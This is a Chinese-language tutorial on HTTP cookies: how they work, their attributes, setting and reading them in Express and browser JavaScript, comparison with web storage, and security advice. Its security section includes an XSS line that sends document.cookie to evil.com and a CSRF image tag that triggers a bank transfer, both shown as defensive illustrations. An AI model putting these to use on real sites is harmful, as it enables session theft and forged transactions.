# Cookie 详解

## 1. 基础介绍

### 1.1 什么是 Cookie

Cookie 是浏览器存储在用户本地的一小段文本数据（通常不超过 4KB），由服务器通过 HTTP 响应头 `Set-Cookie` 下发，浏览器会在后续请求中自动通过 `Cookie` 请求头携带。

**核心特点**:
- 容量限制：单个域名下 Cookie 总量约 4KB
- 自动携带：浏览器在匹配域名和路径时自动附带 Cookie
- 过期机制：可设置过期时间，过期后自动删除
- 跨站限制：受同源策略和 SameSite 属性约束

### 1.2 Cookie 的用途

- **会话管理**：登录状态、购物车、游戏分数等
- **个性化**：用户偏好、主题、语言设置等
- **行为追踪**：分析用户行为、广告投放等

## 2. 工作原理

```
客户端（浏览器）                    服务器
   |                                |
   |-- 1. 发送请求（无 Cookie）---->|
   |                                |
   |<-- 2. 响应 + Set-Cookie ------|
   |    Set-Cookie: id=abc123;      |
   |    Path=/; HttpOnly            |
   |                                |
   |   浏览器保存 Cookie            |
   |                                |
   |-- 3. 后续请求自动携带 Cookie ->|
   |    Cookie: id=abc123           |
   |                                |
   |<-- 4. 服务器识别用户并响应 ----|
```

**完整流程**:
1. 浏览器首次访问服务器，请求中不携带 Cookie
2. 服务器通过 `Set-Cookie` 响应头下发 Cookie
3. 浏览器将 Cookie 保存到本地
4. 后续请求中浏览器自动在 `Cookie` 请求头中携带匹配的 Cookie
5. 服务器读取 Cookie 识别用户身份

## 3. Cookie 属性

### 3.1 属性一览

| 属性 | 说明 | 示例 |
|------|------|------|
| `Name=Value` | Cookie 的键值对 | `token=abc123` |
| `Expires` | 过期时间（绝对时间） | `Expires=Wed, 09 Jun 2027 10:18:14 GMT` |
| `Max-Age` | 有效期（秒数），优先级高于 Expires | `Max-Age=86400` |
| `Domain` | 生效域名，支持子域名 | `Domain=example.com` |
| `Path` | 生效路径 | `Path=/api` |
| `Secure` | 仅 HTTPS 传输 | `Secure` |
| `HttpOnly` | 禁止 JS 访问 | `HttpOnly` |
| `SameSite` | 跨站发送策略 | `SameSite=Lax` |

### 3.2 Expires 和 Max-Age

```http
Set-Cookie: name=value; Expires=Wed, 09 Jun 2027 10:18:14 GMT
Set-Cookie: name=value; Max-Age=86400
```

- **Expires**：指定具体的过期时间点（HTTP 日期格式）
- **Max-Age**：指定从现在起的有效秒数，优先级高于 Expires
- 不设置两者时，Cookie 为 **会话 Cookie**，浏览器关闭后自动删除

### 3.3 Domain 和 Path

```http
Set-Cookie: name=value; Domain=example.com; Path=/api
```

- **Domain**：指定 Cookie 的生效域名
  - 不设置时默认为当前域名（不包含子域名）
  - 设置后包含子域名（如设置 `example.com`，`a.example.com` 也能访问）
- **Path**：指定 Cookie 的生效路径
  - 设置 `/api` 时，访问 `/api` 及其子路径才会携带 Cookie

### 3.4 HttpOnly

```http
Set-Cookie: token=secret; HttpOnly
```

- 设置后 JavaScript 无法通过 `document.cookie` 读取该 Cookie
- 有效防止 XSS 攻击窃取 Cookie
- **建议**：所有敏感 Cookie（如认证 Token）都应设置 HttpOnly

```javascript
// 设置了 HttpOnly 的 Cookie 无法被 JS 读取
document.cookie // 只能看到非 HttpOnly 的 Cookie
```

### 3.5 Secure

```http
Set-Cookie: token=secret; Secure
```

- Cookie 仅通过 HTTPS 协议传输
- 防止在 HTTP 传输中被窃听
- **建议**：生产环境所有 Cookie 都应设置 Secure

### 3.6 SameSite

```http
Set-Cookie: name=value; SameSite=Strict
Set-Cookie: name=value; SameSite=Lax
Set-Cookie: name=value; SameSite=None
```

| 值 | 说明 | 场景 |
|----|------|------|
| `Strict` | 完全禁止第三方 Cookie，从外部链接跳转到站点时不携带 | 安全性要求极高的场景 |
| `Lax`（默认） | 允许 GET 等安全方法的顶级导航携带 Cookie | 大多数场景的默认选择 |
| `None` | 允许跨站发送，**必须同时设置 Secure** | 需要第三方嵌入的场景 |

**SameSite=Lax 的具体行为**:

```
场景                            是否发送 Cookie
从 Google 点击链接进入           ✅ 发送（顶级导航，GET）
从其他网站提交表单到本站          ❌ 不发送（POST 请求）
通过 iframe 加载本站页面         ❌ 不发送（非顶级导航）
通过 <img> 加载本站图片          ❌ 不发送（非导航）
```

## 4. 操作 Cookie

### 4.1 服务端设置 Cookie

**Node.js (Express) 示例**:
```javascript
// 设置 Cookie
res.setHeader('Set-Cookie', [
  'token=abc123; HttpOnly; Secure; SameSite=Lax; Max-Age=86400; Path=/',
  'lang=zh-CN; Max-Age=31536000; Path=/'
])

// 读取 Cookie
const cookie = req.headers.cookie // "token=abc123; lang=zh-CN"

// 删除 Cookie（设置过期时间为过去）
res.setHeader('Set-Cookie', 'token=; Max-Age=0; Path=/')
```

**Express 使用 cookie-parser 中间件**:
```javascript
const cookieParser = require('cookie-parser')
app.use(cookieParser())

// 读取
req.cookies.token // "abc123"

// 设置
res.cookie('token', 'abc123', {
  httpOnly: true,
  secure: true,
  sameSite: 'lax',
  maxAge: 86400000, // 毫秒
  path: '/'
})

// 删除
res.clearCookie('token')
```

### 4.2 客户端操作 Cookie

**读取 Cookie**:
```javascript
// 获取所有非 HttpOnly 的 Cookie
console.log(document.cookie)
// 输出: "name=value; lang=zh-CN"

// 解析 Cookie 为对象
function getCookies() {
  return document.cookie
    .split('; ')
    .filter(item => item)
    .reduce((acc, item) => {
      const [key, value] = item.split('=')
      acc[decodeURIComponent(key)] = decodeURIComponent(value)
      return acc
    }, {})
}
```

**设置 Cookie**:
```javascript
function setCookie(name, value, options = {}) {
  let cookie = `${encodeURIComponent(name)}=${encodeURIComponent(value)}`

  if (options.maxAge) cookie += `; Max-Age=${options.maxAge}`
  if (options.path) cookie += `; Path=${options.path}`
  if (options.domain) cookie += `; Domain=${options.domain}`
  if (options.secure) cookie += '; Secure'
  if (options.httpOnly) cookie += '; HttpOnly'
  if (options.sameSite) cookie += `; SameSite=${options.sameSite}`

  document.cookie = cookie
}

// 使用示例
setCookie('theme', 'dark', { maxAge: 31536000, path: '/', sameSite: 'Lax' })
```

**删除 Cookie**:
```javascript
function deleteCookie(name, path = '/') {
  document.cookie = `${encodeURIComponent(name)}=; Max-Age=0; Path=${path}`
}
```

## 5. Cookie 与其他存储方案对比

| 特性 | Cookie | localStorage | sessionStorage |
|------|--------|-------------|----------------|
| 容量 | ~4KB | ~5MB | ~5MB |
| 生命周期 | 可设置过期时间 | 永久（手动清除） | 会话结束（关闭标签页） |
| 请求携带 | 自动携带 | 不携带 | 不携带 |
| 作用域 | 同源 + Domain/Path | 同源 | 同源 + 同标签页 |
| API | document.cookie | getItem/setItem | getItem/setItem |
| 服务端访问 | ✅ | ❌ | ❌ |

**选择建议**:
- 需要服务端读取（如认证）→ **Cookie**
- 持久化存储大量数据（如偏好设置）→ **localStorage**
- 临时数据（如表单草稿）→ **sessionStorage**

## 6. 安全与最佳实践

### 6.1 常见攻击

**XSS 窃取 Cookie**:
```javascript
// 攻击者注入的脚本可以读取非 HttpOnly 的 Cookie
new Image().src = 'https://evil.com?cookie=' + document.cookie
```

**CSRF 攻击**:
```html
<!-- 攻击者构造的页面，自动发送请求携带用户 Cookie -->
<img src="https://bank.com/transfer?to=hacker&amount=10000">
```

### 6.2 安全配置建议

```
Set-Cookie: token=xxx; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600
```

- **HttpOnly**：防止 XSS 读取敏感 Cookie
- **Secure**：确保仅 HTTPS 传输
- **SameSite=Lax**：防御 CSRF 攻击
- **Path**：最小化 Cookie 的作用范围
- **Max-Age**：设置合理的过期时间，避免长期有效

### 6.3 最佳实践

1. **敏感 Token 设置 HttpOnly + Secure + SameSite**
2. **不要在 Cookie 中存储大量数据**（受 4KB 限制）
3. **使用签名验证 Cookie 值**，防止篡改
4. **减少 Cookie 数量和大小**，避免请求头过大影响性能
5. **合理设置 Domain 和 Path**，避免不必要的请求携带
6. **优先使用 SameSite=Lax 或 Strict**，除非明确需要跨站访问
